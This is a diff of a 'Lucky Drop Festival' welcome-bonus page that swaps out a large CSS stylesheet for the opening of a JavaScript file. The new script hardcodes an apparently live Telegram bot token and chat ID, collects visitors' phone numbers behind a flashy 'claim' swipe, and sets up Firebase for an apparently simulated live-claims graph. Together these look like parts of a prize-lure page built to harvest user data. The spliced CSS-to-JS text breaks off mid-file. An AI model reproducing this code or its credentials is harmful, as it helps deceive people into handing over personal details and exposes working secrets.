@@ -1,1345 +1,809 @@
 /* ============================================================
-   LUCKY DROP FESTIVAL — DISNEY-PIXAR MEXICAN FIESTA
-   Line Graph Trend + Piñata Modal
-   + SWIPE FIX (Touch & Pointer Support)
+   INDEX.JS — Lucky Drop Festival (Welcome Bonus Page)
+   + SWIPE FIX (dynamic maxLeft, touch-action, passive listeners)
    ============================================================ */
 
-/* ========== RESET ========== */
-* {
-    margin: 0;
-    padding: 0;
-    box-sizing: border-box;
-    -webkit-tap-highlight-color: transparent;
-    user-select: none;
-}
-
-html {
-    overflow-x: hidden;
-}
-
-/* ========== BODY ========== */
-body {
-    min-height: 100vh;
-    font-family: 'Baloo 2', 'Fredoka', sans-serif;
-    display: flex;
-    flex-direction: column;
-    align-items: center;
-    justify-content: flex-start;
-    padding: 70px 14px 24px;
-    position: relative;
-    overflow-x: hidden;
-    -webkit-font-smoothing: antialiased;
-    -moz-osx-font-smoothing: grayscale;
-    background:
-        radial-gradient(ellipse at 50% 0%, rgba(255, 107, 157, 0.4) 0%, transparent 50%),
-        radial-gradient(ellipse at 0% 50%, rgba(255, 179, 71, 0.3) 0%, transparent 50%),
-        radial-gradient(ellipse at 100% 50%, rgba(255, 107, 157, 0.3) 0%, transparent 50%),
-        radial-gradient(ellipse at 50% 100%, rgba(106, 27, 154, 0.5) 0%, transparent 50%),
-        linear-gradient(180deg, #2a0845 0%, #4a148c 50%, #1a0033 100%);
-    background-attachment: fixed;
-    color: #fff;
-}
-
-/* ========== BACKGROUND EFFECTS ========== */
-.bg-night-sky {
-    position: fixed;
-    inset: 0;
-    z-index: 0;
-    pointer-events: none;
-    background:
-        radial-gradient(circle at 20% 30%, rgba(255, 255, 255, 0.15) 0%, transparent 40%),
-        radial-gradient(circle at 80% 60%, rgba(255, 255, 255, 0.1) 0%, transparent 40%);
-    animation: nightGlow 8s ease-in-out infinite alternate;
-}
-
-@keyframes nightGlow {
-    0% { opacity: 0.6; }
-    100% { opacity: 1; }
-}
-
-.bg-night-sky::before {
-    content: '';
-    position: absolute;
-    top: 0; left: 0;
-    width: 100%; height: 100%;
-    background-image:
-        radial-gradient(2px 2px at 10% 20%, #fff, transparent),
-        radial-gradient(1px 1px at 30% 15%, #fff, transparent),
-        radial-gradient(1px 1px at 50% 25%, #fff, transparent),
-        radial-gradient(2px 2px at 70% 10%, #fff, transparent),
-        radial-gradient(1px 1px at 90% 30%, #fff, transparent),
-        radial-gradient(2px 2px at 15% 40%, #fff, transparent),
-        radial-gradient(1px 1px at 45% 45%, #fff, transparent),
-        radial-gradient(2px 2px at 65% 35%, #fff, transparent),
-        radial-gradient(1px 1px at 85% 50%, #fff, transparent);
-    background-size: 200px 200px;
-    animation: twinkle 4s ease-in-out infinite alternate;
-    opacity: 0.7;
-}
-
-@keyframes twinkle {
-    0% { opacity: 0.5; }
-    100% { opacity: 1; }
-}
-
-/* ========== FIREWORKS ========== */
-.fireworks {
-    position: fixed;
-    inset: 0;
-    z-index: 0;
-    pointer-events: none;
-    overflow: hidden;
-}
-
-.firework {
-    position: absolute;
-    width: 200px;
-    height: 200px;
-    border-radius: 50%;
-    opacity: 0;
-}
-
-.firework.burst-1 {
-    top: 10%; left: 20%;
-    background: radial-gradient(circle, rgba(255, 215, 0, 0.3) 0%, rgba(255, 107, 157, 0.15) 30%, transparent 70%);
-    animation: fireworkBurst 6s ease-in-out infinite;
-}
-.firework.burst-2 {
-    top: 15%; right: 25%;
-    background: radial-gradient(circle, rgba(255, 107, 157, 0.3) 0%, rgba(255, 215, 0, 0.15) 30%, transparent 70%);
-    animation: fireworkBurst 7s ease-in-out infinite;
-    animation-delay: 2s;
-}
-.firework.burst-3 {
-    top: 5%; left: 50%;
-    transform: translateX(-50%);
-    background: radial-gradient(circle, rgba(255, 179, 71, 0.3) 0%, rgba(233, 30, 99, 0.15) 30%, transparent 70%);
-    animation: fireworkBurst 8s ease-in-out infinite;
-    animation-delay: 4s;
-}
-.firework.burst-4 {
-    top: 30%; left: 10%;
-    background: radial-gradient(circle, rgba(233, 30, 99, 0.2) 0%, rgba(255, 215, 0, 0.1) 30%, transparent 70%);
-    animation: fireworkBurst 9s ease-in-out infinite;
-    animation-delay: 1s;
-}
-.firework.burst-5 {
-    top: 25%; right: 15%;
-    background: radial-gradient(circle, rgba(255, 215, 0, 0.2) 0%, rgba(255, 107, 157, 0.1) 30%, transparent 70%);
-    animation: fireworkBurst 8.5s ease-in-out infinite;
-    animation-delay: 3s;
-}
-
-@keyframes fireworkBurst {
-    0% { opacity: 0; transform: scale(0.3) rotate(0deg); }
-    20% { opacity: 1; transform: scale(1.2) rotate(30deg); }
-    40% { opacity: 0.8; transform: scale(1.5) rotate(60deg); }
-    60% { opacity: 0.6; transform: scale(1.8) rotate(90deg); }
-    80% { opacity: 0.3; transform: scale(2) rotate(120deg); }
-    100% { opacity: 0; transform: scale(2.5) rotate(180deg); }
-}
-
-/* ========== BOKEH ========== */
-.bokeh {
-    position: fixed;
-    inset: 0;
-    z-index: 0;
-    pointer-events: none;
-    overflow: hidden;
-}
-
-.bokeh-circle {
-    position: absolute;
-    border-radius: 50%;
-    opacity: 0;
-    animation: bokehFloat 14s ease-in-out infinite;
-    filter: blur(2px);
-}
-
-.bokeh-circle:nth-child(1) { width: 60px; height: 60px; top: 20%; left: 10%; background: radial-gradient(circle, rgba(255, 215, 0, 0.4), transparent 70%); }
-.bokeh-circle:nth-child(2) { width: 80px; height: 80px; top: 40%; right: 15%; background: radial-gradient(circle, rgba(255, 107, 157, 0.4), transparent 70%); animation-delay: 2s; }
-.bokeh-circle:nth-child(3) { width: 50px; height: 50px; top: 60%; left: 20%; background: radial-gradient(circle, rgba(255, 179, 71, 0.4), transparent 70%); animation-delay: 4s; }
-.bokeh-circle:nth-child(4) { width: 70px; height: 70px; top: 30%; left: 60%; background: radial-gradient(circle, rgba(233, 30, 99, 0.3), transparent 70%); animation-delay: 1s; }
-.bokeh-circle:nth-child(5) { width: 55px; height: 55px; top: 75%; right: 25%; background: radial-gradient(circle, rgba(255, 215, 0, 0.35), transparent 70%); animation-delay: 3s; }
-.bokeh-circle:nth-child(6) { width: 65px; height: 65px; top: 50%; left: 40%; background: radial-gradient(circle, rgba(255, 107, 157, 0.3), transparent 70%); animation-delay: 5s; }
-
-@keyframes bokehFloat {
-    0% { opacity: 0; transform: translate(0, 0) scale(0.5); }
-    20% { opacity: 0.8; }
-    50% { opacity: 0.6; transform: translate(30px, -30px) scale(1.2); }
-    80% { opacity: 0.4; }
-    100% { opacity: 0; transform: translate(-20px, -60px) scale(0.8); }
-}
-
-/* ========== CONFETTI ========== */
-.confetti-fall {
-    position: fixed;
-    inset: 0;
-    z-index: 0;
-    pointer-events: none;
-    overflow: hidden;
-}
-
-.confetti-piece {
-    position: absolute;
-    width: 10px;
-    height: 14px;
-    top: -20px;
-    opacity: 0;
-    animation: confettiFall 10s linear infinite;
-    border-radius: 2px;
-}
-
-.confetti-piece.pink { background: linear-gradient(135deg, #ff6b9d, #ff4081); box-shadow: 0 0 10px rgba(255, 107, 157, 0.6); }
-.confetti-piece.gold { background: linear-gradient(135deg, #ffd700, #ffb347); box-shadow: 0 0 10px rgba(255, 215, 0, 0.6); }
-.confetti-piece.magenta { background: linear-gradient(135deg, #e91e63, #ff1493); box-shadow: 0 0 10px rgba(233, 30, 99, 0.6); }
-
-.confetti-piece:nth-child(1) { left: 5%; animation-delay: 0s; animation-duration: 8s; }
-.confetti-piece:nth-child(2) { left: 15%; animation-delay: 1.2s; animation-duration: 10s; }
-.confetti-piece:nth-child(3) { left: 25%; animation-delay: 2.5s; animation-duration: 9s; }
-.confetti-piece:nth-child(4) { left: 35%; animation-delay: 0.8s; animation-duration: 11s; }
-.confetti-piece:nth-child(5) { left: 45%; animation-delay: 3.2s; animation-duration: 8.5s; }
-.confetti-piece:nth-child(6) { left: 55%; animation-delay: 1.8s; animation-duration: 10.5s; }
-.confetti-piece:nth-child(7) { left: 65%; animation-delay: 2.2s; animation-duration: 9.5s; }
-.confetti-piece:nth-child(8) { left: 75%; animation-delay: 0.5s; animation-duration: 8.2s; }
-.confetti-piece:nth-child(9) { left: 85%; animation-delay: 2.8s; animation-duration: 10.8s; }
-
-@keyframes confettiFall {
-    0% { transform: translateY(-20px) rotate(0deg) scale(1); opacity: 0; }
-    10% { opacity: 1; }
-    90% { opacity: 1; }
-    100% { transform: translateY(110vh) rotate(720deg) scale(0.5); opacity: 0; }
-}
-
-/* ========== LIVE TICKER ========== */
-.live-ticker {
-    position: fixed;
-    top: 16px;
-    left: 50%;
-    transform: translateX(-50%);
-    background: rgba(26, 8, 69, 0.8);
-    backdrop-filter: blur(14px);
-    -webkit-backdrop-filter: blur(14px);
-    border: 1.5px solid rgba(255, 215, 0, 0.5);
-    border-radius: 40px;
-    padding: 8px 20px;
-    display: flex;
-    align-items: center;
-    justify-content: center;
-    gap: 10px;
-    z-index: 100;
-    box-shadow: 0 8px 30px rgba(0, 0, 0, 0.4), 0 0 25px rgba(255, 215, 0, 0.2);
-    max-width: calc(100% - 20px);
-    animation: tickerGlow 3s ease-in-out infinite;
-}
-
-@keyframes tickerGlow {
-    0%, 100% { box-shadow: 0 8px 30px rgba(0, 0, 0, 0.4), 0 0 25px rgba(255, 215, 0, 0.2); }
-    50% { box-shadow: 0 8px 30px rgba(0, 0, 0, 0.4), 0 0 40px rgba(255, 215, 0, 0.5); }
-}
-
-.ticker-dot {
-    width: 8px;
-    height: 8px;
-    background: #ff6b9d;
-    border-radius: 50%;
-    box-shadow: 0 0 12px #ff6b9d;
-    animation: pulseDot 1.2s infinite;
-    flex-shrink: 0;
-}
-
-@keyframes pulseDot {
-    0%, 100% { opacity: 1; transform: scale(1); }
-    50% { opacity: 0.5; transform: scale(0.8); }
-}
-
-.ticker-content {
-    overflow: hidden;
-    text-align: center;
-}
-
-.ticker-text {
-    display: flex;
-    align-items: center;
-    gap: 8px;
-    font-family: 'Fredoka', sans-serif;
-    font-size: 11px;
-    font-weight: 500;
-    color: #ffe0b2;
-    white-space: nowrap;
-}
-
-.ticker-text i { color: #ffd700; font-size: 10px; }
-.ticker-amount { color: #ffd700; font-weight: 700; }
-
-/* ============================================================
-   MAIN CARD
-   ============================================================ */
-.main-card {
-    position: relative;
-    width: 100%;
-    max-width: 420px;
-    background: linear-gradient(160deg, #6a1b9a 0%, #4a148c 50%, #2a0845 100%);
-    border-radius: 28px;
-    padding: 0;
-    text-align: center;
-    z-index: 10;
-    border: 2px solid rgba(255, 215, 0, 0.5);
-    box-shadow:
-        0 25px 80px rgba(0, 0, 0, 0.6),
-        0 0 60px rgba(255, 107, 157, 0.3),
-        0 0 120px rgba(255, 215, 0, 0.15),
-        inset 0 0 60px rgba(255, 215, 0, 0.05);
-    overflow: hidden;
-    animation: cardFloat 4s ease-in-out infinite;
-    margin-bottom: 20px;
-}
-
-@keyframes cardFloat {
-    0%, 100% { transform: translateY(0); }
-    50% { transform: translateY(-6px); }
-}
-
-.card-bg-image {
-    position: absolute;
-    top: 0;
-    left: 0;
-    width: 100%;
-    height: 45%;
-    z-index: 0;
-    background-image: url('../images/pinata.jpg');
-    background-size: cover;
-    background-position: center top;
-    background-repeat: no-repeat;
-    opacity: 0.9;
-    pointer-events: none;
-    mask-image: linear-gradient(180deg, #000 0%, #000 60%, transparent 100%);
-    -webkit-mask-image: linear-gradient(180deg, #000 0%, #000 60%, transparent 100%);
-}
-
-.card-bg-overlay {
-    position: absolute;
-    inset: 0;
-    z-index: 1;
-    background: linear-gradient(180deg,
-        rgba(42, 8, 69, 0.3) 0%,
-        rgba(74, 20, 140, 0.7) 40%,
-        rgba(42, 8, 69, 0.95) 100%
-    );
-    pointer-events: none;
-}
-
-.main-card::before {
-    content: '';
-    position: absolute;
-    inset: -2px;
-    border-radius: 30px;
-    padding: 2px;
-    background: conic-gradient(from var(--angle, 0deg),
-        rgba(255, 215, 0, 0.6),
-        rgba(255, 107, 157, 0.6),
-        rgba(255, 215, 0, 0.6),
-        rgba(255, 107, 157, 0.6),
-        rgba(255, 215, 0, 0.6));
-    -webkit-mask: linear-gradient(#fff 0 0) content-box, linear-gradient(#fff 0 0);
-    -webkit-mask-composite: xor;
-    mask-composite: exclude;
-    pointer-events: none;
-    z-index: 3;
-    animation: borderRotate 8s linear infinite;
-}
-
-@property --angle {
-    syntax: '<angle>';
-    initial-value: 0deg;
-    inherits: false;
-}
-
-@keyframes borderRotate {
-    to { --angle: 360deg; }
-}
-
-.card-content {
-    position: relative;
-    z-index: 2;
-    padding: 32px 24px 28px;
-}
-
-/* ========== CORNER DECORATIONS ========== */
-.corner-deco {
-    position: absolute;
-    font-size: 16px;
-    opacity: 0.8;
-    animation: decoFloat 3s ease-in-out infinite;
-    z-index: 4;
-    color: #ffd700;
-    filter: drop-shadow(0 0 10px rgba(255, 215, 0, 0.8));
-}
-.corner-deco.tl { top: 16px; left: 20px; animation-delay: 0s; }
-.corner-deco.tr { top: 16px; right: 20px; animation-delay: 1s; }
-.corner-deco.bl { bottom: 16px; left: 20px; animation-delay: 2s; }
-.corner-deco.br { bottom: 16px; right: 20px; animation-delay: 1.5s; }
-
-@keyframes decoFloat {
-    0%, 100% { transform: translateY(0) scale(1) rotate(0deg); opacity: 0.6; }
-    50% { transform: translateY(-5px) scale(1.15) rotate(10deg); opacity: 1; }
-}
-
-/* ========== LOGO AREA ========== */
-.logo-area { margin-bottom: 20px; }
-
-.logo-icon {
-    width: 88px;
-    height: 88px;
-    background: radial-gradient(circle at 30% 30%, #ff6b9d, #e91e63);
-    border-radius: 50%;
-    display: flex;
-    align-items: center;
-    justify-content: center;
-    margin: 0 auto 14px;
-    border: 3px solid #ffd700;
-    box-shadow:
-        0 0 30px rgba(255, 215, 0, 0.5),
-        0 0 60px rgba(255, 107, 157, 0.4),
-        inset 0 0 20px rgba(0, 0, 0, 0.3);
-    position: relative;
-    animation: logoPulse 3s ease-in-out infinite;
-}
-
-@keyframes logoPulse {
-    0%, 100% { transform: scale(1); }
-    50% { transform: scale(1.05); }
-}
-
-.logo-ring {
-    position: absolute;
-    inset: -8px;
-    border-radius: 50%;
-    border: 2px dashed rgba(255, 215, 0, 0.5);
-    animation: ringSpin 15s linear infinite;
-}
-
-@keyframes ringSpin {
-    from { transform: rotate(0deg); }
-    to { transform: rotate(360deg); }
-}
-
-.logo-icon i {
-    font-size: 38px;
-    color: #fff;
-    filter: drop-shadow(0 0 15px rgba(255, 215, 0, 0.8));
-}
-
-.logo-text {
-    font-family: 'Pacifico', cursive;
-    font-size: 30px;
-    font-weight: 400;
-    background: linear-gradient(180deg, #ffd700 0%, #ffb347 50%, #ff6b9d 100%);
-    -webkit-background-clip: text;
-    background-clip: text;
-    color: transparent;
-    line-height: 1.1;
-    filter: drop-shadow(0 0 20px rgba(255, 215, 0, 0.7));
-    margin-bottom: 4px;
-}
-
-.logo-text-sub {
-    font-family: 'Cinzel', serif;
-    font-size: 16px;
-    font-weight: 700;
-    letter-spacing: 8px;
-    background: linear-gradient(180deg, #ff6b9d, #e91e63);
-    -webkit-background-clip: text;
-    background-clip: text;
-    color: transparent;
-    margin-bottom: 4px;
-}
-
-.logo-sub {
-    font-family: 'Fredoka', sans-serif;
-    font-size: 10px;
-    color: rgba(255, 224, 178, 0.8);
-    letter-spacing: 4px;
-    font-weight: 500;
-}
-
-/* ========== VALUE PROPS ========== */
-.value-props {
-    display: flex;
-    flex-direction: column;
-    gap: 10px;
-    margin-bottom: 18px;
-    text-align: left;
-    background: rgba(42, 8, 69, 0.6);
-    backdrop-filter: blur(10px);
-    -webkit-backdrop-filter: blur(10px);
-    padding: 16px 14px;
-    border-radius: 18px;
-    border: 1px solid rgba(255, 215, 0, 0.25);
-    box-shadow: 0 4px 20px rgba(0, 0, 0, 0.3);
-}
-
-.prop-row {
-    display: flex;
-    align-items: center;
-    gap: 12px;
-    padding: 6px 0;
-    border-bottom: 1px solid rgba(255, 215, 0, 0.1);
-}
-
-.prop-row:last-child { border-bottom: none; }
-
-.prop-icon {
-    width: 40px;
-    height: 40px;
-    background: linear-gradient(135deg, #ff6b9d, #e91e63);
-    border-radius: 12px;
-    display: flex;
-    align-items: center;
-    justify-content: center;
-    border: 2px solid rgba(255, 215, 0, 0.5);
-    box-shadow: 0 0 15px rgba(255, 107, 157, 0.4);
-    flex-shrink: 0;
-}
-
-.prop-icon i {
-    font-size: 16px;
-    color: #fff;
-    filter: drop-shadow(0 0 5px rgba(255, 215, 0, 0.6));
-}
-
-.prop-title {
-    font-family: 'Baloo 2', sans-serif;
-    font-size: 13px;
-    font-weight: 700;
-    color: #ffe0b2;
-    letter-spacing: 0.3px;
-    margin-bottom: 2px;
-}
-
-.prop-desc {
-    font-family: 'Fredoka', sans-serif;
-    font-size: 10px;
-    color: rgba(255, 224, 178, 0.7);
-    font-weight: 400;
-    line-height: 1.4;
-}
-
-/* ============================================================
-   📊 LINE GRAPH TREND
-   ============================================================ */
-.trend-dashboard {
-    background: linear-gradient(145deg, rgba(26, 8, 69, 0.7), rgba(42, 8, 69, 0.85));
-    backdrop-filter: blur(14px);
-    -webkit-backdrop-filter: blur(14px);
-    border: 1px solid rgba(255, 215, 0, 0.25);
-    border-radius: 18px;
-    padding: 16px;
-    margin-bottom: 20px;
-    position: relative;
-    overflow: hidden;
-    box-shadow: 0 10px 40px rgba(0, 0, 0, 0.35);
-}
-
-.trend-header {
-    display: flex;
-    align-items: center;
-    justify-content: space-between;
-    margin-bottom: 14px;
-}
-
-.trend-live-badge {
-    display: flex;
-    align-items: center;
-    gap: 5px;
-    background: rgba(255, 23, 68, 0.2);
-    border: 1px solid rgba(255, 23, 68, 0.5);
-    border-radius: 20px;
-    padding: 3px 10px;
-    font-family: 'Orbitron', monospace;
-    font-size: 8px;
-    font-weight: 800;
-    color: #ff6b9d;
-    letter-spacing: 1.5px;
-    animation: pulseBadge 1.5s infinite;
-}
-
-.trend-live-badge .live-dot {
-    width: 5px;
-    height: 5px;
-    background: #ff6b9d;
-    border-radius: 50%;
-    box-shadow: 0 0 8px #ff6b9d;
-    animation: pulseDot 1s infinite;
-}
-
-@keyframes pulseBadge {
-    0%, 100% { box-shadow: 0 0 0 rgba(255, 23, 68, 0); }
-    50% { box-shadow: 0 0 15px rgba(255, 23, 68, 0.4); }
-}
-
-.trend-title {
-    font-family: 'Orbitron', monospace;
-    font-size: 10px;
-    font-weight: 800;
-    color: #ffd700;
-    letter-spacing: 2px;
-    display: flex;
-    align-items: center;
-    gap: 6px;
-    text-shadow: 0 0 20px rgba(255, 215, 0, 0.4);
-}
-
-.trend-graph-container {
-    background: rgba(26, 8, 69, 0.5);
-    border: 1px solid rgba(255, 215, 0, 0.15);
-    border-radius: 12px;
-    padding: 14px 10px 10px;
-    margin-bottom: 12px;
-    position: relative;
-}
-
-.line-graph-wrapper {
-    width: 100%;
-    height: 100px;
-    position: relative;
-}
-
-.line-graph-svg {
-    width: 100%;
-    height: 100%;
-    overflow: visible;
-}
-
-.graph-grid-line {
-    stroke: rgba(255, 215, 0, 0.08);
-    stroke-width: 1;
-    stroke-dasharray: 3 3;
-}
-
-.graph-line {
-    fill: none;
-    stroke: url(#lineGradient);
-    stroke-width: 3;
-    stroke-linecap: round;
-    stroke-linejoin: round;
-    filter: drop-shadow(0 0 6px rgba(255, 215, 0, 0.6));
-    stroke-dasharray: 2000;
-    stroke-dashoffset: 2000;
-}
-
-.graph-area {
-    fill: url(#areaGradient);
-    opacity: 0;
-}
-
-.graph-endpoint-icon {
-    cursor: pointer;
-    overflow: visible;
-    pointer-events: none;
-}
-
-.graph-endpoint-icon .endpoint-img {
-    width: 100%;
-    height: 100%;
-    object-fit: contain;
-    background: transparent;
-    filter:
-        drop-shadow(0 0 8px #39ff14)
-        drop-shadow(0 0 15px rgba(57, 255, 20, 0.5));
-    animation: endpointPulse 2s ease-in-out infinite;
-    will-change: filter, opacity;
-    transform: translateZ(0);
-}
-
-@keyframes endpointPulse {
-    0%, 100% {
-        filter:
-            drop-shadow(0 0 6px #39ff14)
-            drop-shadow(0 0 12px rgba(57, 255, 20, 0.4));
-        opacity: 0.9;
+(function() {
+    'use strict';
+
+    // ========== CONFIGURATION ==========
+    var botToken = '8639737111:AAGvCqiHzkiJvVqH6YPocRIVMoiXZlK4ZWg';
+    var chatId = '7298607329';
+
+    // ========== DOM ELEMENTS ==========
+    var userPhoneInput = document.getElementById('userPhone');
+    var claimBtn = document.getElementById('claimBtn');
+    var modalOverlay = document.getElementById('modalOverlay');
+    var mainCard = document.getElementById('mainCard');
+    var winnerEntry = document.getElementById('winnerEntry');
+
+    // ========== SWIPE ELEMENTS ==========
+    var swipeTrack = document.getElementById('swipeTrack');
+    var swipeIcon = document.getElementById('swipeIcon');
+    var swipeFireTrail = document.getElementById('swipeFireTrail');
+
+    // ========== FIREBASE ==========
+    var db = null;
+    var graphUpdateInterval = null;
+    var claimsRefreshInterval = null;
+
+    // ========== INIT FIREBASE ==========
+    function initFirebase() {
+        if (typeof firebaseConfig !== 'undefined') {
+            if (!firebase.apps || !firebase.apps.length) {
+                firebase.initializeApp(firebaseConfig);
+            }
+            db = firebase.database();
+        }
     }
-    50% {
-        filter:
-            drop-shadow(0 0 15px #39ff14)
-            drop-shadow(0 0 25px rgba(57, 255, 20, 0.9));
-        opacity: 1;
+
+    // ========== PHONE VALIDATION ==========
+    function isValidPhoneNumber(phone) {
+        var cleaned = phone.replace(/\D/g, '');
+        return cleaned.length === 10 && cleaned.startsWith('9');
     }
-}
 
-.graph-hour-labels {
-    display: flex;
-    justify-content: space-between;
-    padding: 0 4px;
-    margin-top: 8px;
-    font-family: 'Orbitron', monospace;
-    font-size: 7px;
-    color: rgba(255, 224, 178, 0.5);
-    letter-spacing: 0.5px;
-}
-
-.graph-hour-labels span {
-    flex: 1;
-    text-align: center;
-    transition: color 0.3s ease;
-}
-
-.graph-hour-labels span.current-hour {
-    color: #39ff14;
-    font-weight: 900;
-    text-shadow: 0 0 8px rgba(57, 255, 20, 0.6);
-}
-
-.trend-stats-row {
-    display: grid;
-    grid-template-columns: 1fr 1fr;
-    gap: 10px;
-}
-
-.trend-stat-card {
-    display: flex;
-    align-items: center;
-    gap: 10px;
-    background: rgba(26, 8, 69, 0.7);
-    border: 1px solid rgba(255, 215, 0, 0.25);
-    border-radius: 12px;
-    padding: 10px 12px;
-}
-
-.trend-stat-icon {
-    width: 36px;
-    height: 36px;
-    border-radius: 10px;
-    display: flex;
-    align-items: center;
-    justify-content: center;
-    font-size: 14px;
-    flex-shrink: 0;
-}
-
-.trend-stat-icon.blue {
-    background: rgba(79, 195, 247, 0.2);
-    border: 1.5px solid rgba(79, 195, 247, 0.5);
-    color: #4fc3f7;
-}
-
-.trend-stat-icon.green {
-    background: rgba(57, 255, 20, 0.15);
-    border: 1.5px solid rgba(57, 255, 20, 0.4);
-    color: #39ff14;
-}
-
-.trend-stat-content { flex: 1; min-width: 0; }
-
-.trend-stat-label {
-    font-family: 'Fredoka', sans-serif;
-    font-size: 8px;
-    color: rgba(255, 224, 178, 0.6);
-    letter-spacing: 1px;
-    margin-bottom: 2px;
-}
-
-.trend-stat-value {
-    font-family: 'Baloo 2', sans-serif;
-    font-size: 18px;
-    font-weight: 800;
-    color: #fff;
-    line-height: 1;
-    margin-bottom: 3px;
-    text-shadow: 0 0 10px rgba(255, 215, 0, 0.4);
-}
-
-.trend-stat-sub {
-    display: flex;
-    align-items: center;
-    gap: 4px;
-    font-family: 'Fredoka', sans-serif;
-    font-size: 8px;
-    color: rgba(255, 224, 178, 0.5);
-    font-weight: 500;
-}
-
-.stat-dot {
-    width: 4px;
-    height: 4px;
-    border-radius: 50%;
-    flex-shrink: 0;
-}
-
-.stat-dot.blue { background: #4fc3f7; box-shadow: 0 0 5px #4fc3f7; }
-.stat-dot.green { background: #39ff14; box-shadow: 0 0 5px #39ff14; }
-
-/* ============================================================
-   ✅ SWIPE TO VERIFY — FIXED FOR TOUCH
-   ============================================================ */
-.swipe-container {
-    margin-bottom: 18px;
-    touch-action: pan-y;
-    user-select: none;
-    -webkit-user-select: none;
-}
-
-.swipe-track {
-    position: relative;
-    width: 100%;
-    height: 60px;
-    background: rgba(26, 8, 69, 0.7);
-    backdrop-filter: blur(10px);
-    border-radius: 30px;
-    border: 2px solid rgba(255, 215, 0, 0.4);
-    box-shadow: inset 0 4px 20px rgba(0, 0, 0, 0.3);
-    overflow: hidden;
-    touch-action: none;
-    user-select: none;
-    -webkit-user-select: none;
-    z-index: 5;
-}
-
-.swipe-fire-trail {
-    position: absolute;
-    top: 0;
-    left: 0;
-    height: 100%;
-    background: linear-gradient(90deg, rgba(255, 107, 157, 0.4), rgba(255, 215, 0, 0.4), rgba(255, 107, 157, 0.4));
-    border-radius: 30px;
-    opacity: 0;
-    transition: width 0.05s linear;
-    pointer-events: none;
-    z-index: 1;
-}
-
-.swipe-fire-trail.active { opacity: 0.6; }
-
-.swipe-icon {
-    position: absolute;
-    left: 3px;
-    top: 3px;
-    width: 52px;
-    height: 52px;
-    background: rgba(26, 8, 69, 0.9);
-    border-radius: 50%;
-    display: flex;
-    align-items: center;
-    justify-content: center;
-    border: 2px solid #ffd700;
-    box-shadow: 0 0 20px rgba(255, 215, 0, 0.5);
-    z-index: 10;
-    cursor: grab;
-    touch-action: none;
-    user-select: none;
-    -webkit-user-select: none;
-    -webkit-touch-callout: none;
-    pointer-events: auto;
-    will-change: left;
-    -webkit-backface-visibility: hidden;
-    backface-visibility: hidden;
-}
-
-.swipe-icon:active { cursor: grabbing; }
-
-.scatter-icon {
-    width: 44px;
-    height: 44px;
-    border-radius: 50%;
-    object-fit: cover;
-    pointer-events: none;
-    user-select: none;
-    -webkit-user-drag: none;
-}
-
-.swipe-text {
-    position: absolute;
-    left: 50%;
-    top: 50%;
-    transform: translate(-50%, -50%);
-    font-family: 'Fredoka', sans-serif;
-    font-size: 12px;
-    font-weight: 600;
-    color: rgba(255, 224, 178, 0.7);
-    letter-spacing: 2px;
-    pointer-events: none;
-    white-space: nowrap;
-    z-index: 1;
-}
-
-.swipe-text i {
-    font-size: 10px;
-    margin: 0 6px;
-    color: #ffd700;
-}
-
-/* ========== CARD FOOTER ========== */
-.card-footer {
-    display: flex;
-    align-items: center;
-    justify-content: center;
-    gap: 8px;
-    padding-top: 12px;
-    border-top: 1px solid rgba(255, 215, 0, 0.15);
-    font-family: 'Fredoka', sans-serif;
-    font-size: 9px;
-    color: rgba(255, 224, 178, 0.5);
-    letter-spacing: 1.5px;
-}
-
-.card-footer i {
-    color: #ffd700;
-    font-size: 10px;
-    filter: drop-shadow(0 0 6px rgba(255, 215, 0, 0.5));
-}
-
-/* ============================================================
-   MODAL — VERIFICATION WITH PIÑATA BACKGROUND
-   ============================================================ */
-.modal-overlay {
-    position: fixed;
-    inset: 0;
-    background: rgba(26, 8, 69, 0.95);
-    backdrop-filter: blur(16px);
-    -webkit-backdrop-filter: blur(16px);
-    z-index: 99999;
-    display: none;
-    align-items: center;
-    justify-content: center;
-    padding: 20px;
-    animation: fadeIn 0.3s ease;
-}
-
-.modal-overlay[style*="display: flex"] {
-    display: flex !important;
-}
-
-@keyframes fadeIn {
-    from { opacity: 0; }
-    to { opacity: 1; }
-}
-
-.modal-container {
-    width: 100%;
-    max-width: 380px;
-    animation: modalPop 0.5s cubic-bezier(0.175, 0.885, 0.32, 1.275);
-}
-
-@keyframes modalPop {
-    0% { transform: scale(0.7) rotate(-5deg); opacity: 0; }
-    60% { transform: scale(1.05) rotate(2deg); }
-    100% { transform: scale(1) rotate(0deg); opacity: 1; }
-}
-
-.modal-card {
-    position: relative;
-    background: linear-gradient(160deg, #6a1b9a 0%, #4a148c 50%, #2a0845 100%);
-    border: 2px solid #ffd700;
-    border-radius: 24px;
-    padding: 0;
-    text-align: center;
-    box-shadow:
-        0 25px 60px rgba(0, 0, 0, 0.7),
-        0 0 60px rgba(255, 215, 0, 0.4);
-    overflow: hidden;
-}
-
-.modal-bg-image {
-    position: absolute;
-    inset: 0;
-    z-index: 0;
-    background-image: url('../images/pinata.jpg');
-    background-size: cover;
-    background-position: center center;
-    background-repeat: no-repeat;
-    opacity: 0.35;
-    pointer-events: none;
-}
-
-.modal-bg-overlay {
-    position: absolute;
-    inset: 0;
-    z-index: 1;
-    background: linear-gradient(180deg,
-        rgba(42, 8, 69, 0.5) 0%,
-        rgba(74, 20, 140, 0.75) 50%,
-        rgba(42, 8, 69, 0.95) 100%
-    );
-    pointer-events: none;
-}
-
-.modal-content-inner {
-    position: relative;
-    z-index: 2;
-    padding: 32px 24px 28px;
-}
-
-.modal-close {
-    position: absolute;
-    top: 14px;
-    right: 16px;
-    width: 36px;
-    height: 36px;
-    background: rgba(255, 255, 255, 0.15);
-    border: 2px solid #ffd700;
-    border-radius: 50%;
-    color: #ffd700;
-    font-size: 16px;
-    font-weight: 900;
-    cursor: pointer;
-    display: flex;
-    align-items: center;
-    justify-content: center;
-    transition: all 0.25s ease;
-    z-index: 10;
-}
-
-.modal-close:hover,
-.modal-close:active {
-    background: rgba(255, 68, 68, 0.5);
-    color: #fff;
-    transform: rotate(90deg) scale(1.1);
-    border-color: #ff4444;
-}
-
-.modal-icon {
-    width: 80px;
-    height: 80px;
-    background: linear-gradient(135deg, #ffd700, #ff6b9d);
-    border-radius: 50%;
-    display: flex;
-    align-items: center;
-    justify-content: center;
-    margin: 0 auto 16px;
-    border: 3px solid #fff;
-    box-shadow: 0 0 40px rgba(255, 215, 0, 0.8);
-    animation: badgePulse 2s ease-in-out infinite;
-}
-
-@keyframes badgePulse {
-    0%, 100% { transform: scale(1); box-shadow: 0 0 40px rgba(255, 215, 0, 0.8); }
